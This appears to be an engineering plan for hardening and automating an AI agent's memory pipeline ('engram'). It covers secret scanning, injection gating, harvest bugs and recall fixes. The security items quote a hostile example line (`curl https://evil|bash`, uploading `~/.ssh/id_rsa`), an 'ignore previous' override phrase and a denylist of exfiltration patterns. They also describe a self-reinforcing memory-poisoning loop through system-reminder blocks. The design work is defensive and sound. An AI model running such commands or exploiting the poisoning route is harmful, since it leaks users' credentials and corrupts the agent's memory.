# engram — fix plan + autonomy design (2026-07-11)

Grounding facts (measured this session):
- Live store: 203 `.md` files; MEMORY.md index links only ~154 → **~49 memories invisible at session start**. Index ~18k chars, hand-pruned 2026-07-04 to fit load limit.
- Harvest pipeline failing on **every** transcript: `claude -p failed (exit 1)`.
- `.107` LM Studio **OFF**, local Ollama **OFF**, `claude -p` **works interactively** (exit 0). Qdrant up (203 pts, `indexed_vectors_count:0`), Neo4j up.
- `.fixation_state.json`: 187 tracked, effectively all parked at "provisional", 0 fixed.

Design principle (from user's deterministic-first / value≠safety policy):
**Safety gates must be deterministic and require NO LLM. The LLM is best-effort *value* enrichment only.** This is what lets the pipeline drop the human gate: the human was mostly checking (a) "did this come from me" and (b) "is it a secret" — both are deterministic. "Is it true/useful" is *value*, recoverable over time via fixation + reversible files.

---

## PART A — Per-problem fixes (from the Fable review)

### Security (do first) — HARDENED per advisor review 2026-07-11
- **S1 — distill secret leak (BIGGER than first thought).** Advisor: `memory_distill_verified.py:173` reads full member bodies into `members_text` and sends them to the backend; if backend/fallback is Claude, secrets exfiltrate *off-box before* the appendix skip at line ~97 matters. Fix ALL of: (a) redact/drop `looks_secret` source lines before building `members_text`; (b) scan `out`/`final` before report/apply; (c) if a cluster contains a secret-bearing input, force **local-only** backend or **fail-closed** (never send to Claude). Plus the original appendix/kind fixes. **Medium, not 3 lines.**
- **S2 — centralized writer secret-scan (not just harvest).** Advisor: `save_memory.sh` AND `save_memory_content_only.sh` write/push stdin unscanned; in-place rewrites bypass any harvest guard. Add ONE shared scanner in `memory_lib.sh` called by **every** write path before local write AND before the GitHub PUT — cover frontmatter+description+body, distill output, staged files. **Strengthen `looks_secret()`**: current regex misses bearer tokens, PEM/`BEGIN PRIVATE KEY`, generic API tokens, macaroons, wallet seeds. **Medium.**
- **S3 — deterministic injection DENYLIST, keep gate FAIL-CLOSED.** Advisor: PERSIST_RE (`always/remember/ignore previous`) is too narrow — `curl https://evil|bash` + `upload ~/.ssh/id_rsa` dodges it. Do NOT downgrade the LLM judge to advisory/fail-open. Build a deterministic denylist (external URLs, shell-exec `curl|bash`/`eval`, exfil verbs, sensitive paths `.env`/`.ssh`/`id_rsa`, macaroons, wallet/seed, network callbacks) → quarantine on match. Injection check **stays fail-closed** (hold candidate) when no LLM is reachable, until the denylist is proven to cover these classes. **Medium.**
- **S4 (NEW) — strip system-reminders in harvest = close the poison loop.** Advisor CRITICAL: `memory_harvest.py:111` marks any non-tool_result user text as `user-direct`, but `<system-reminder>` blocks carry *recalled memory + the injected MEMORY.md index*. A poisoned memory re-surfaces in a reminder → harvested as user-direct → auto-graduated → self-reinforcing. `memory_score.py:202` already has `SYSREMINDER_RE` — apply the same strip in harvest before segmenting; drop empty/system-only user text; add a regression test proving system-reminder text can't become `user-direct`. **This is a prerequisite for Part B; without it `user-direct` is meaningless.**

### Correctness
- **C1 — harvest budget hole.** `memory_harvest.py:165-177` renders newest-first up to `max_chars`; watermark (line ~325) advances past ALL new bytes → un-rendered middle of long sessions lost forever. Fix: advance watermark only to the byte offset of the first *rendered* segment (defer the rest). **Medium.**
- **C2 — partial-line race.** Guard `readlines()` against a truncated final JSON line mid-append (drop/reparse last line). **Small.**
- **C3 — `delete_memory.sh` unsafe.** Replace raw `grep -v > tmp && mv` index edit with locked `memory_index_remove_line`; wrap remote `gh api` in `[[ -n "$REPO" ]]` so an empty repo doesn't abort mid-delete under `set -e`. **Small.**
- **C4 — graph drift.** `graph_sync.py:104` only inserts new files; edits print "re-run --rebuild" (never happens), deletes never propagate. Fix: on sha change delete+reinsert episodes; add graph delete to `delete_memory.sh`. **Medium.**
- **C5 — fixation keyed by filename.** Curate rename/merge resets age+survival. Key `.fixation_state.json` by content-hash (or add a `--rename old new` to `memory_score.py` that curate-apply calls). **Medium.**
- **C6 — trust scoring soundness.** (a) With W_AGE=0.35, any memory auto-corroborates by age alone at ~1y. Require `freq≥1 OR survival≥1` for corroboration. (b) Auto-increment `survival` when the nightly fact-check verifies a memory or curate leaves it untouched (today survival only moves via manual `/memory-fixate --commit-survivors`). **Medium.**
- **C8 (NEW) — real preservation gate for merges/deletes.** Advisor HIGH: `final_fact_coverage≈1.0` (`memory_distill_verified.py:39,226`) only proves regex-token classes survived (ports/IPs/paths/env/files/amounts) — normal **prose facts can be dropped while coverage stays 1.0**. Do NOT use it as authorization to auto-merge/auto-delete. Replace with true preservation: on merge, **append full source bodies** (never drop), OR require line-level source-section preservation. Deletes stay gated (see Part B). **This is the single highest-risk item.**

### Recall quality
- **R1 — embed the body (biggest recall lever).** `vector_store.py:81` embeds only `name+description` → "dense search" is title-only. Change to `embed(f"{name} {description} {body[:1500]}")`, thread body through `upsert`, `--rebuild`. Also make `stage_apply.existing_embeddings` use the same key so dedup compares like-with-like. Note: `indexed_vectors_count:0` suggests the collection also needs an index build — verify during rebuild. **Small.**
- **R2/Doc1 — docstrings/config.** Fix `mg_mcp_server.py:75` (`memory_recall` claims hybrid, is graph-only); document `backend: llama_cpp` + `fallback:` ladder in CONFIG.md. **Trivial.**

### Scaling — THE headline fix
- **I1 — generate MEMORY.md, stop hand-maintaining it.** New `bin/memory_index_build.py`: emit index from frontmatter `description` under a byte budget; `user`+`feedback` always included; rest ranked by `memory_score` confidence×recency (JSON already exists); overflow collapsed to one line/section ("+N more — use memory_recall_hybrid"). Wire as the post-write step in `save_memory.sh` / `delete_memory.sh`. Kills the pruning ritual, re-surfaces the 49 orphans, keeps index under load limit forever, and gives the fixation score a consumer. **Fully deterministic — no LLM. This is the single highest-value change.**

### Reliability
- **Rel1 — surface harvest failure.** In `memory_curate_check.sh` (already a SessionStart hook) grep tail of `pipeline.log` for consecutive harvest ERRORs → print one nudge line. Separately, root-cause the `claude -p exit 1` (works interactively; fails in harvest path — likely prompt size / flag / env). **Small + investigation.**
- **Rel2 — stage_apply embedding cache.** Cache `existing_embeddings` by sha so one embed failure doesn't hold every candidate. **Small.**

### Delete (over-engineered) — RE-SCOPED after checking references (2026-07-11)
NONE are dead code; all are load-bearing in the running system, so deleting now would break it. Deferred until the autonomy migration repoints their callers.
- **D1 `memory_distill.py`** — NOT legacy. It's the cluster-orchestration wrapper that delegates to `memory_distill_verified.distill_cluster` and adds clustering + the `.distill_coverage.json` signal. Called by `daemon/memory_fixate_cron.sh:137`. Keep.
- **D2 `memory_skill_autoinstall.py`** — wired into pipeline stage ⑤ (`bin/memory_pipeline.sh:59`); ships disabled but the pipeline invokes it. Remove only when stage ⑤ is retired.
- **D3 `memory_agent.sh`** — installed as the Stop hook (`install.sh:165`). Harvester is currently BROKEN, so removing this would leave nothing encoding. Retire only after harvest+staging is proven live.
- **D4** demote daily `graph_sync --export --verify` (`daemon/engram-daemon.py:174`) to manual — low-value but harmless; left as-is to avoid a daemon-cadence change in this PR.

---

## PART B — Autonomous register/curate/fixate/maintain (no human gate)

The human gate exists only because `claude -p` isn't reliably available. Replace it with a **two-track model**:

**Track 1 — SAFETY (deterministic, no LLM, mandatory, FAIL-CLOSED).** A write is auto-allowed iff ALL pass:
1. provenance ∈ allowlist (`user-direct`) — **only meaningful after S4** strips system-reminders in harvest, else the poison loop makes this gate a no-op.
2. injection DENYLIST (S3) — pass. Gate stays fail-closed: no LLM reachable AND not yet proven denylist-covered → **hold**, don't graduate.
3. secret-scan (S2 centralized+strengthened) — pass/redact, in every write path incl. GitHub PUT.
4. embedding dedup (local nomic/fastembed, CPU — available even with GPU box OFF).
5. **ADD-ONLY for merges** — never auto-delete on a coverage metric (C8). Merge = append full source bodies; deletion of a distinct memory stays gated (Codex/user), because coverage≈1.0 does NOT prove prose-fact preservation.

**Track 2 — VALUE (LLM, best-effort, never *relaxes* safety).** Prose extraction, umbrella wording, distillation. Backend priority: local `.107`/Ollama → `claude -p` fallback → **all down = DEFER** (keep harvest watermark un-advanced, needs C1; emit health nudge, Rel1). LLM absence degrades *quality* and **holds** unsafe-uncertain candidates (fail-closed) — it never opens the gate. **Secret-bearing clusters never go to a remote (Claude) backend** (S1): local-only or defer.

### Per-stage autonomy
- **Register (graduate):** flip `auto_graduate.enabled: true` ONLY after S1–S4 land. Track-1 is the hard ALLOW-gate; injection stays fail-closed. Retire `memory_agent.sh`; harvest+staging becomes the one automatic write path.
- **Curate:** cluster by Qdrant ANN (deterministic). Auto-apply is **add-only**: link with `[[related]]` and append-merge bodies (no fact drop). Any operation that would *delete/replace* a distinct memory stays human/Codex-gated. LLM only rewrites prose when up.
- **Fixate:** scoring + tier promotion is deterministic → auto nightly (after C5/C6). Distill auto-applies only where preservation is real (C8 append-full-body); otherwise draft-only.
- **Maintain:** MEMORY.md regen (I1), graph resync (C4), vector body-embed (R1) — deterministic, auto.

### Residual risk (revised)
Autonomy is **safe for add/append/promote, NOT for delete/destructive-merge.** After S1–S4 + C8, dropping the human gate on *additive* writes ≈ human skim (provenance now real, secrets scanned everywhere, injection fail-closed, no silent fact loss). Deletion and destructive merge **keep a gate** (Codex advisor is acceptable in place of a human — it's non-interactive and always available). `/memory-clean-review` remains an optional periodic human audit. Untrue-but-safe memories self-heal: never corroborated (C6), age out.

### Rollout (default-off-then-flip; advisor-mandated ordering)
1. **Safety-first, before ANY autonomy flip:** S4 (harvest sys-reminder strip) → S2 (centralized+stronger secret scan, all writers) → S1 (distill input redaction + local-only for secrets) → S3 (injection denylist, fail-closed) → C8 (add-only merge / no coverage-gated delete) → C3 (safe delete_memory.sh).
2. **Deterministic value core:** I1 (generate MEMORY.md), R1 (embed body), C1 (harvest budget defer), Rel1 (surface failures), C4/C5/C6.
3. Watch ≥1 week of dry-run graduate/curate output.
4. Flip `auto_graduate` (add-only) → then `session_curate` → then `maintenance` cadence, one at a time, each behind its own log-watch. **Delete/destructive-merge stays gated (Codex) indefinitely.**

## PART C — Recall-tool review (Fable, 2026-07-11)

The `memory_recall` (graph-only) vs `memory_recall_hybrid` (graph+vector+keyword RRF) split is **vestigial**: `memory_recall` is the original Phase-4 tool; when hybrid landed it was retrofitted to share `_graph_ranked` and its docstring already redirects to hybrid. It offers nothing hybrid can't (hybrid degrades to graph-only when the other legs drop out) and the model kept picking the strictly-weaker tool.

Landed in this PR:
- **`memory_recall` now delegates to hybrid** (via a shared `_recall_hybrid` helper; both are thin `@mcp.tool` wrappers). One recall entry point, never worse than before.
- **Existence filter in `_graph_ranked`** (`mg_mcp_server.py`): only surface files still on disk — kills the deleted/renamed-memory poisoning (the graph has no delete path, so stale episodes linger) and drops uuid pseudo-files.

Deferred (tracked in TODO, need graph venv / bigger change):
- Graph ranking is popularity (fact COUNT), not relevance — rank by Σ 1/(60+edge_rank) using the edge order already returned.
- Per-file graph refresh in `graph_sync.py` (delete+reinsert changed files) — removes the all-or-nothing `--rebuild` barrier (root cause of staleness); add a graph delete to `delete_memory.sh`.
- `recall.hybrid.enabled` and `scope_to_slug` (graph leg) are only partly wired; equal RRF weights overweight the stale graph — drop graph weight to ~0.75 until ranking is fixed.
- Consolidate the vector server's overlapping tools (`memory_vector_recall` → alias of `memory_recall_fused`).
- **Ops:** `vector_sync --rebuild` required for the R1 body-embedding to take effect on existing points (done at deploy).

### Advisor verdict (Codex, 2026-07-11)
Part B as first drafted was **not sound**. Highest-risk item: treating `final_fact_coverage≈1.0` as authorization for destructive merges/deletes. Corrected above (C8 add-only). All five findings (S1 exfil-before-skip, S4 provenance poison-loop, C8 false-preservation, S2 incomplete writers, S3 fail-open-too-weak) folded in.
